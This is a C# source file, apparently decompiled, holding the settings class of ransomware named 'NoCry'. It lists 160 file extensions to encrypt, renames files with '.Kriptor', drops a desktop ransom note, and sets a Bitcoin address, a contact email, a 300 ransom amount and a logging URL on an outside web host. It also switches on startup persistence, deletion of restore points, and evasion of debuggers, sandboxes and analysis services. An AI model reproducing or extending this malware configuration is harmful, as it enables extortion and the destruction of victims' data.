using System;
using System.Collections.Generic;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace NoCry;

public class Class1
{
	public class Settings
	{
		public static string hash;

		public static bool startup = Conversions.ToBoolean("True");

		public static bool DeleteRestorePoints = Conversions.ToBoolean("True");

		public static string mute = "vYtzIm0SDgeCYX5eq8g7";

		public static IEnumerable<string> mExtesiones = new string[160]
		{
			".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".txt", ".aet", ".ai",
			".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi", ".bay", ".bmp",
			".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".csv", ".db",
			".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm",
			".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv", ".idml",
			".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".jpeg", ".jpg",
			".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid", ".mov",
			".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw", ".odb",
			".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b", ".p7c", ".pdb",
			".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot", ".potm", ".potx",
			".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel", ".prproj",
			".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar", ".raw", ".rb",
			".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf", ".srw",
			".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv", ".wpd",
			".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".xlsb", ".xlsm",
			".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip", ".iso", ".exe"
		};

		public static string exs = ".Kriptor";

		public static string html = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\How To Decrypt My Files.html";

		public static string btc = "bc1qm4hh4ll0szauwhfys8lvgssf4j9vqympslyaaa";

		public static string email = "leljicok@gmail.com";

		public static string amount = "300";

		public static string logg = "https://kajiww121.000webhostapp.com/kkskskasksksakskkdkskakskdskdk@21151525162/log.php";

		public static int maxrandom = 20;

		public static string validchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

		public static bool Emulator = Conversions.ToBoolean("True");

		public static bool DetectDebugger = Conversions.ToBoolean("True");

		public static bool DetectSandboxie = Conversions.ToBoolean("True");

		public static bool DetectVirtualMachine = Conversions.ToBoolean("False");

		public static bool anyrun = Conversions.ToBoolean("True");

		public static string Setting = "Runcount.cry";

		public static int H = 71;

		public static int m = 59;

		public static object Del = Interaction.GetSetting("D", "0", Setting, "");

		public static string Attempts = Conversions.ToString(6);
	}
}
